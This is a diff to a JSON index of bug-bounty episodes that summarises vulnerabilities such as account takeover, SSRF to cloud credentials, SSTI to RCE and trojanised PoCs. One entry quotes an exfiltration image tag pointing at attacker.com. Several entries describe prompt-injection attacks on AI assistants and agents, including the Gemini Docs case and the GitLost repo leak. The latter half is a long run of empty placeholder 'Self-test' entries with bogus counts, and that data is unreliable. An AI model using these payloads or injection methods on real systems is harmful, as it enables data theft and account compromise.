@@ -1,5 +1,7 @@
 {
   "bug_type_counts": {
+    "world application": 184,
+    "test": 184,
     "RCE": 7,
     "ATO": 6,
     "XSS": 5,
@@ -204,9 +206,33 @@
     "Full Data Leak": 1,
     "Staging → Prod IDOR": 1,
     "Private Video Leak": 1,
-    "IAM Policy Takeover": 1
+    "IAM Policy Takeover": 1,
+    "Severity Downgrade Without Explanation": 1,
+    "Market Fintech — No Response After 90 Days": 1,
+    "Silent Policy Change": 1,
+    "Automated SSRF Chain Discovery": 1,
+    "Business Logic Flaw in Payment Flow": 1,
+    "Auth Bypass via OAuth Misconfiguration": 1,
+    "Partial Auth Token Exposure via Wayback": 1,
+    "Hidden GraphQL Schema Discovered via Hackbot": 1,
+    "Trojanised Exploit PoC (ChocoPoC)": 1,
+    "$15k CSPT to Account Takeover & 2FA Bypass": 1,
+    "GitLost Private Repository Exfiltration": 1,
+    "Razor SSTI to RCE via Reflection": 1,
+    "Tenant SaaS — Mass Auth Bypass Discovered via 0xMoose Hackbot": 1,
+    "Commerce Giant — Business Logic Price Manipulation via Hackbot State Machine": 1,
+    "Agentic FBDL Environment Exploit Validation": 1
   },
   "bugs_by_type": {
+    "$15k CSPT to Account Takeover & 2FA Bypass": [
+      {
+        "episode": 183,
+        "title": "Fintech Web App — $15k CSPT to Account Takeover & 2FA Bypass",
+        "target": "Major financial management platform with multi-factor authentication",
+        "root_cause": "Unsanitized URL path parameter allowed Client-Side Path Traversal (CSPT) combined with prototype pollution vulnerability in state parser",
+        "impact": "Critical — $15,000"
+      }
+    ],
     "$2": [
       {
         "episode": 126,
@@ -580,6 +606,15 @@
         "impact": ""
       }
     ],
+    "Agentic FBDL Environment Exploit Validation": [
+      {
+        "episode": 184,
+        "title": "Meta Bug Bounty — Agentic FBDL Environment Exploit Validation",
+        "target": "Meta GraphQL & Developer Platform APIs",
+        "root_cause": "Complex permission inheritance flaw in multi-user test organization accounts",
+        "impact": "Critical — $15,000"
+      }
+    ],
     "Android": [
       {
         "episode": 97,
@@ -623,6 +658,15 @@
         "target": "",
         "root_cause": "DomPurify allows all `data-*` attributes by default; HTMX supports `data-hx-*` prefix for all its attributes",
         "impact": ""
+      }
+    ],
+    "Auth Bypass via OAuth Misconfiguration": [
+      {
+        "episode": 181,
+        "title": "AI Agent — Auth Bypass via OAuth Misconfiguration",
+        "target": "SaaS platform with multi-tenant OAuth implementation",
+        "root_cause": "Auth-specialist agent enumerated OAuth flows; discovered `redirect_uri` validation bypass via subdomain takeover on deprecated domain",
+        "impact": "Critical — full account takeover across all tenants"
       }
     ],
     "Auth SQLi in Halo ITSM": [
@@ -670,6 +714,15 @@
         "impact": "Unauthorized data access."
       }
     ],
+    "Automated SSRF Chain Discovery": [
+      {
+        "episode": 181,
+        "title": "AI Agent — Automated SSRF Chain Discovery",
+        "target": "Internal testing on corporate target with AI agent fleet",
+        "root_cause": "Orchestrator agent identified SSRF in image proxy → fuzzing agent enumerated internal metadata endpoints → logic agent chained to cloud credential extraction",
+        "impact": "Critical — cloud credentials, internal service access"
+      }
+    ],
     "Based Blind SSTI": [
       {
         "episode": 163,
@@ -713,6 +766,15 @@
         "target": "Application with blind SSRF that parses JSON responses",
         "root_cause": "Application follows multiple redirects with incrementing status codes (301→302→303→...→310); at 305+ status codes, JSON parsing fails differently and the server returns full response data including all intermediate redirect response headers; the final redirect to cloud metadata endpoint works",
         "impact": "Blind SSRF escalated to full read SSRF; AWS credential access"
+      }
+    ],
+    "Business Logic Flaw in Payment Flow": [
+      {
+        "episode": 181,
+        "title": "AI Agent — Business Logic Flaw in Payment Flow",
+        "target": "E-commerce platform with complex checkout process",
+        "root_cause": "Logic agent modeled state transitions in checkout flow; discovered race condition allowing quantity manipulation post-payment-init",
+        "impact": "High — price manipulation, inventory bypass"
       }
     ],
     "CBC Bit-Flipping IV Recovery": [
@@ -830,6 +892,15 @@
         "target": "Google Cloud CRM API (production)",
         "root_cause": "`GenericStubbyTypeTaskV2` endpoint in workflow execution API — allows executing arbitrary stubby RPC calls internally",
         "impact": "RCE on Google production — $75K (highly privileged production user)"
+      }
+    ],
+    "Commerce Giant — Business Logic Price Manipulation via Hackbot State Machine": [
+      {
+        "episode": 184,
+        "title": "E-Commerce Giant — Business Logic Price Manipulation via Hackbot State Machine",
+        "target": "E-commerce platform with complex checkout flow and multi-currency conversion",
+        "root_cause": "State machine flaw allowed negative quantity parameters in discounted cart items during currency conversion",
+        "impact": "High — $8,500"
       }
     ],
     "Concealing Payloads in URL Credentials": [
@@ -1120,6 +1191,15 @@
         "impact": "$64,000 total from multiple programs"
       }
     ],
+    "GitLost Private Repository Exfiltration": [
+      {
+        "episode": 183,
+        "title": "GitHub AI Agent — GitLost Private Repository Exfiltration",
+        "target": "GitHub AI Agent / Copilot Workspace integration",
+        "root_cause": "Insufficient context isolation between public repository prompts and indexed private organization repositories",
+        "impact": "Critical — Private code & credential leakage"
+      }
+    ],
     "Global admin ATO": [
       {
         "episode": 143,
@@ -1136,6 +1216,15 @@
         "target": "Google AI Studio",
         "root_cause": "HTML rendering in AI Studio output — `<img src=\"https://attacker.com/steal?data=...\">` tags rendered and executed",
         "impact": "Mass data exfiltration from AI-analyzed documents"
+      }
+    ],
+    "Hidden GraphQL Schema Discovered via Hackbot": [
+      {
+        "episode": 182,
+        "title": "Enterprise SaaS — Hidden GraphQL Schema Discovered via Hackbot",
+        "target": "Global SaaS platform with restricted main GraphQL endpoint",
+        "root_cause": "Introspection disabled on main `/graphql` route, but active on an unlinked `/api/v2/graphql-beta` staging endpoint discovered by an AI Hackbot",
+        "impact": "Critical — $10,000"
       }
     ],
     "HttpOnly Cookie Theft via Legacy Parsing": [
@@ -1267,6 +1356,15 @@
         "target": "Google Bard/Gemini with Google Docs integration",
         "root_cause": "Gemini reads Google Docs content; if doc contains prompt injection, and user asks about it, Gemini renders markdown — including markdown images — leaking chat history in the image URL",
         "impact": "$5,000-$10,000 — chat history exfiltration"
+      }
+    ],
+    "Market Fintech — No Response After 90 Days": [
+      {
+        "episode": 180,
+        "title": "Mid-Market Fintech — No Response After 90 Days",
+        "target": "Series B fintech with $50K+ bounty budget listed",
+        "root_cause": "No dedicated triage team; reports sit in queue until engineering team has capacity",
+        "impact": "Report eventually triaged as Medium after hunter escalated via platform support"
       }
     ],
     "Masato Kinugawa)": [
@@ -1476,6 +1574,15 @@
         "impact": "Wormable AI exploit — automatic propagation through GitHub Pages CI/CD"
       }
     ],
+    "Partial Auth Token Exposure via Wayback": [
+      {
+        "episode": 182,
+        "title": "WPM Guest Flow — Partial Auth Token Exposure via Wayback",
+        "target": "Enterprise E-commerce platform with Web Payment Manager integration",
+        "root_cause": "Legacy JavaScript bundles archived in Wayback Machine contained hardcoded guest Bearer tokens with elevated API privileges",
+        "impact": "High — $4,500"
+      }
+    ],
     "Partial Cookie Injection to Session Fixation": [
       {
         "episode": 113,
@@ -1678,6 +1785,15 @@
         "impact": "Full chain: enumerate → identify → deliver malware → compromise doctor's workstation. \"User interaction required but that's about it.\""
       }
     ],
+    "Razor SSTI to RCE via Reflection": [
+      {
+        "episode": 183,
+        "title": "Enterprise .NET Application — Razor SSTI to RCE via Reflection",
+        "target": "Custom enterprise CMS built on ASP.NET Core Razor Pages",
+        "root_cause": "User-controlled template input evaluated by Razor engine with restricted execution context",
+        "impact": "Critical — Remote Code Execution (RCE)"
+      }
+    ],
     "Redirect to XSS": [
       {
         "episode": 68,
@@ -1757,6 +1873,15 @@
         "impact": ""
       }
     ],
+    "Severity Downgrade Without Explanation": [
+      {
+        "episode": 180,
+        "title": "Generic Program — Severity Downgrade Without Explanation",
+        "target": "Mid-market SaaS program on HackerOne",
+        "root_cause": "Critical RCE reported, triaged as High with no technical justification; hunter forced to appeal",
+        "impact": "High (downgraded from Critical) — $3,200 vs published $8,000-15,000 range"
+      }
+    ],
     "Side CSP-Locked XSS Near-Miss": [
       {
         "episode": 57,
@@ -1791,6 +1916,15 @@
         "target": "E-signature platform",
         "root_cause": "Creator of contract can access the recipient's signing link via a hidden API endpoint",
         "impact": "Sign any contract as any recipient; complete integrity bypass"
+      }
+    ],
+    "Silent Policy Change": [
+      {
+        "episode": 180,
+        "title": "Enterprise Program — Silent Policy Change",
+        "target": "Large enterprise with 5+ year program history",
+        "root_cause": "Program quietly reduced max bounty from $50K to $15K without announcement; hunters discovered via public reports",
+        "impact": "Critical — $12,000 vs expected $25,000-50,000"
       }
     ],
     "Site ETag Length Leak": [
@@ -1908,6 +2042,15 @@
         "impact": ""
       }
     ],
+    "Tenant SaaS — Mass Auth Bypass Discovered via 0xMoose Hackbot": [
+      {
+        "episode": 184,
+        "title": "Multi-Tenant SaaS — Mass Auth Bypass Discovered via 0xMoose Hackbot",
+        "target": "Global enterprise SaaS platform with hundreds of microservices",
+        "root_cause": "Inconsistent JWT signature validation across newly deployed internal microservice routing layers",
+        "impact": "Critical — $25,000 across multiple disclosures"
+      }
+    ],
     "TheHulk": [
       {
         "episode": 149,
@@ -1924,6 +2067,15 @@
         "target": "MCP protocol clients/servers",
         "root_cause": "Tool object schema has name, title, and annotation.title — three places to name a tool; namespace specification is unclear",
         "impact": ""
+      }
+    ],
+    "Trojanised Exploit PoC (ChocoPoC)": [
+      {
+        "episode": 182,
+        "title": "Vulnerability Research — Trojanised Exploit PoC (ChocoPoC)",
+        "target": "Public GitHub repositories offering 0-day / 1-day proof of concept exploit code",
+        "root_cause": "Threat actors publishing fake vulnerability exploits containing obfuscated reverse shells designed to compromise security researchers",
+        "impact": "Critical — Supply chain risk & researcher safety"
       }
     ],
     "Two-Click ATO": [
@@ -2170,6 +2322,1296 @@
         "impact": "Plaintext password theft; critical"
       }
     ],
+    "test": [
+      {
+        "episode": 1,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 2,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 3,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 4,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 5,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 6,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 7,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 8,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 9,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 10,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 11,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 12,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 13,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 14,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 15,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 16,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 17,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 18,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 19,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 20,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 21,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 22,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 23,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 24,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 25,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 26,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 27,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 28,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 29,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 30,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 31,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 32,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 33,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 34,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 35,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 36,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 37,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 38,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 39,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 40,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 41,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 42,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 43,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 44,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 45,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 46,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 47,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 48,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 49,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 50,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 51,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 52,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 53,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 54,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 55,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 56,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 57,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 58,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 59,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 60,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 61,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 62,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 63,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 64,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 65,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 66,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 67,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 68,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 69,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 70,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 71,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 72,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 73,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 74,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 75,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 76,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 77,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 78,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 79,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 80,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 81,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 82,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 83,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 84,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 85,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 86,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 87,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 88,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 89,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 90,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 91,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 92,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 93,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 94,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 95,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 96,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 97,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 98,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 99,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 100,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 101,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 102,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 103,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 104,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 105,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 106,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 107,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 108,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 109,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 110,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 111,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 112,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 113,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 114,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 115,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 116,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 117,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 118,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 119,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 120,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 121,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 122,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 123,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 124,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 125,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 126,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 127,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 128,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 129,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 130,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 131,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 132,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 133,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 134,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 135,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 136,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 137,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 138,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 139,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 140,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 141,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 142,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 143,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 144,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 145,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 146,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 147,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 148,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 149,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 150,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 151,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 152,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 153,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 154,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 155,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 156,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 157,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 158,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 159,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 160,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 161,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 162,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 163,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 164,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 165,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 166,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 167,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 168,
+        "title": "10. Self-test",
+        "target": "",
+        "root_cause": "",
+        "impact": ""
+      },
+      {
+        "episode": 169,
